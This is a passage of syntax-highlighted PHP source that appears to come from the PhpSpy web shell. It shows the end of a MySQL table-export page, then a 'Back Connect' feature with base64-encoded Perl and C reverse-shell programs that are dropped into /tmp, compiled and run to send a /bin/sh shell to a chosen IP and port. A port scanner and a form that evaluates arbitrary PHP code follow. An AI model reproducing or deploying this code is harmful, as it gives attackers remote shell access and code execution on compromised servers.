<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">highver</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;tr class='</span>.<span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>).<span style="color: #66cccc;">'&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;Total tables: '</span>.$<span style="color: #ffcc66;">table_num</span>.<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">table_rows</span>.<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td&gt;'</span>.$<span style="color: #ffcc66;">data_size</span>.<span style="color: #66cccc;">'&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;td colspan="'</span>.($<span style="color: #ffcc66;">highver</span> ? <span style="color: #cccccc; background-color: #2d2d2d;">5</span> : <span style="color: #cccccc; background-color: #2d2d2d;">3</span>).<span style="color: #66cccc;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/tr&gt;'</span>);

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;tr class=\""</span>.<span style="color: #cccccc; background-color: #2d2d2d;">bg(</span>).<span style="color: #66cccc;">"\"&gt;&lt;td colspan=\""</span>.($<span style="color: #ffcc66;">highver</span> ? <span style="color: #cccccc; background-color: #2d2d2d;">9</span> : <span style="color: #cccccc; background-color: #2d2d2d;">7</span>).<span style="color: #66cccc;">"\"</span><span style="color: #66cccc; text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span><span style="text-decoration: underline;">.</span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">SA_ROOT</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'doing'</span>,<span style="color: #66cccc;">'backupmysql'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;/table&gt;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fr(</span>$<span style="color: #ffcc66;">query</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">tbfoot(</span>);
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_close(</span>);
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end mysql</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'backconnect'</span>) {
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">yourip</span> &amp;&amp; $<span style="color: #ffcc66;">yourip</span> = $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'REMOTE_ADDR'</span>];
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">yourport</span> &amp;&amp; $<span style="color: #ffcc66;">yourport</span> = <span style="color: #66cccc;">'12345'</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">usedb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'perl'</span>=&gt;<span style="color: #66cccc;">'perl'</span>,<span style="color: #66cccc;">'c'</span>=&gt;<span style="color: #66cccc;">'c'</span>);

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">back_connect</span>=<span style="color: #66cccc;">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ</span><span style="color: #66cccc; text-decoration: underline;">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9</span><span style="color: #66cccc; text-decoration: underline;">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3</span><span style="color: #66cccc; text-decoration: underline;">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT</span><span style="color: #66cccc; text-decoration: underline;">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y</span><span style="color: #66cccc; text-decoration: underline;">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ</span><span style="color: #66cccc; text-decoration: underline;">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">back_connect_c</span>=<span style="color: #66cccc;">"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0</span><span style="color: #66cccc; text-decoration: underline;">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb</span><span style="color: #66cccc; text-decoration: underline;">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog</span><span style="color: #66cccc; text-decoration: underline;">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp</span><span style="color: #66cccc; text-decoration: underline;">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV</span><span style="color: #66cccc; text-decoration: underline;">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M</span><span style="color: #66cccc; text-decoration: underline;">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z</span><span style="color: #66cccc; text-decoration: underline;">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp"</span><span style="text-decoration: underline;">.</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #66cccc;">"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB</span><span style="color: #66cccc; text-decoration: underline;">jbG9zZShmZCk7IA0KfQ=="</span><span style="text-decoration: underline;">;</span>

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">start</span> &amp;&amp; $<span style="color: #ffcc66;">yourip</span> &amp;&amp; $<span style="color: #ffcc66;">yourport</span> &amp;&amp; $<span style="color: #ffcc66;">use</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">use</span> == <span style="color: #66cccc;">'perl'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">cf(</span><span style="color: #66cccc;">'/tmp/angel_bc'</span>,$<span style="color: #ffcc66;">back_connect</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #cccccc; background-color: #2d2d2d;">execute(which(</span><span style="color: #66cccc;">'perl'</span>).<span style="color: #66cccc;">" /tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">cf(</span><span style="color: #66cccc;">'/tmp/angel_bc.c'</span>,$<span style="color: #ffcc66;">back_connect_c</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">'gcc -o /tmp/angel_bc /tmp/angel_bc.c'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">unlink(</span><span style="color: #66cccc;">'/tmp/angel_bc.c'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #cccccc; background-color: #2d2d2d;">execute(</span><span style="color: #66cccc;">"/tmp/angel_bc $yourip $yourport &amp;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">"Now script try connect to $yourip port $yourport ..."</span>);
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Back Connect'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'backconnect'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'Your IP:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'yourip'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">20</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">yourip</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'Your Port:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'yourport'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">15</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">yourport</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'Use:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeselect(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'use'</span>,<span style="color: #66cccc;">'option'</span>=&gt;$<span style="color: #ffcc66;">usedb</span>,<span style="color: #66cccc;">'selected'</span>=&gt;$<span style="color: #ffcc66;">use</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'start'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #66cccc;">'Start'</span>,<span style="color: #66cccc;">'type'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'class'</span>=&gt;<span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'portscan'</span>) {
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">scanip</span> &amp;&amp; $<span style="color: #ffcc66;">scanip</span> = <span style="color: #66cccc;">'127.0.0.1'</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">scanport</span> &amp;&amp; $<span style="color: #ffcc66;">scanport</span> = <span style="color: #66cccc;">'21,25,80,110,135,139,445,1433,3306,3389,5631,4395</span><span style="color: #66cccc; text-decoration: underline;">8'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Port Scan'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'portscan'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'IP:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'scanip'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">20</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">scanip</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'Port:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'scanport'</span>,<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">80</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">scanport</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'startscan'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #66cccc;">'Scan'</span>,<span style="color: #66cccc;">'type'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'class'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #66cccc; text-decoration: underline;">'bt'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">startscan</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>(<span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">','</span>, $<span style="color: #ffcc66;">scanport</span>) <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">port</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">fsockopen(</span>$<span style="color: #ffcc66;">scanip</span>, $<span style="color: #ffcc66;">port</span>, &amp;$<span style="color: #ffcc66;">errno</span>, &amp;$<span style="color: #ffcc66;">errstr</span>, <span style="color: #cccccc; background-color: #2d2d2d;">1</span>);<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!$<span style="color: #ffcc66;">fp</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;li&gt;'</span>.$<span style="color: #ffcc66;">scanip</span>.<span style="color: #66cccc;">':'</span>.$<span style="color: #ffcc66;">port</span>.<span style="color: #66cccc;">' ------------------------ &lt;span styl</span><span style="color: #66cccc; text-decoration: underline;">e="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>  } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;li&gt;'</span>.$<span style="color: #ffcc66;">scanip</span>.<span style="color: #66cccc;">':'</span>.$<span style="color: #ffcc66;">port</span>.<span style="color: #66cccc;">' ------------------------ &lt;span styl</span><span style="color: #66cccc; text-decoration: underline;">e="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>  }<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/ul&gt;'</span>);
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'eval'</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">phpcode</span> = <span style="color: #cccccc; background-color: #2d2d2d;">trim(</span>$<span style="color: #ffcc66;">phpcode</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">phpcode</span>){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (!<span style="color: #cccccc; background-color: #2d2d2d;">preg_match(</span><span style="color: #66cccc;">'#&lt;\?#si'</span>, $<span style="color: #ffcc66;">phpcode</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">phpcode</span> = <span style="color: #66cccc;">"&lt;?php\n\n{$phpcode}\n\n?&gt;"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">eval(</span><span style="color: #66cccc;">"?"</span>.<span style="color: #66cccc;">"&gt;$phpcode&lt;?"</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=<span style="color: #6699cc;">&gt;</span><span style="color: #66cccc;">'Eval PHP Code'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'eval'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">maketext(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'PHP Code'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'phpcode'</span>, <span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">phpcode</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #66cccc;">'ww.4ng'</span>.<span style="color: #66cccc;">'el.net/php'</span>.<span style="color: #66cccc;">'spy/pl'</span>.<span style="color: #66cccc;">'ugin/" target="_bla</span><span style="color: #66cccc; text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
